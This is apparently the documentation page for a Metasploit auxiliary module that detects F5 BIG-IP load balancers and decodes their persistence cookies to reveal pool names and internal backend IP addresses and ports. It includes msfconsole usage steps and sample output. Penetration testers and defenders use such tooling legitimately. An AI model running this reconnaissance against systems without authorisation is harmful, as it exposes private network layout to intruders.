## Description

This module identifies F5 BIG-IP load balancers and leaks backend information (pool name, routed domain, and backend servers' IP addresses and ports) through cookies inserted by the BIG-IP systems.

For further information:

* [K6917: Overview of BIG-IP persistence cookie encoding](https://support.f5.com/csp/article/K6917)
* [K7784: Configuring BIG-IP cookie encryption (9.x)](https://support.f5.com/csp/article/K7784)
* [K14784: Configuring cookie encryption within the HTTP profile (10.x - 15.x)](https://support.f5.com/csp/article/K14784)
* [K23254150: Configuring cookie encryption for BIG-IP persistence cookies from the cookie persistence profile](https://support.f5.com/csp/article/K23254150)

## Verification Steps

1. Start `msfconsole`
2. Select the module: `use auxiliary/gather/f5_bigip_cookie_disclosure`
3. Select your target(s): `set RHOSTS www.example.com`
4. Run the module: `run`

## Options

  **REQUESTS**

  The number of requests to send. Default value is `10`.

  **RPORT**

  The BIG-IP service port. Default value is `443`.

  **TARGETURI**

  The URI path to test. Default value is `/`.

## Scenarios

### F5 BIP-IP load balancing cookie not found

  ```
  msf5 > use auxiliary/gather/f5_bigip_cookie_disclosure
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > set RHOSTS www.example.com
  RHOSTS => www.example.com
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > run
  [*] Running module against 93.184.216.34

  [*] Starting request /
  [-] F5 BIG-IP load balancing cookie not found
  [*] Auxiliary module execution completed
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) >
  ```

### F5 BIP-IP load balancing cookie found

  The sensitive information have been replaced with fake ones for privacy reasons:

  ```
  msf5 > use auxiliary/gather/f5_bigip_cookie_disclosure
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > set RHOSTS vulnerable-target.com
  RHOSTS => vulnerable-target.com
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) > run
  [*] Running module against 1.1.1.1

  [*] Starting request /
  [+] F5 BIG-IP load balancing cookie "BIGipServer~DMZ~EXAMPLE~vulnarable-target-443_pool = 1214841098.47873.0000" found
  [+] Load balancing pool name "~DMZ~EXAMPLE~vulnarable-target-443_pool" found
  [+] Backend 10.1.105.72:443 found
  [*] Auxiliary module execution completed
  msf5 auxiliary(gather/f5_bigip_cookie_disclosure) >
  ```
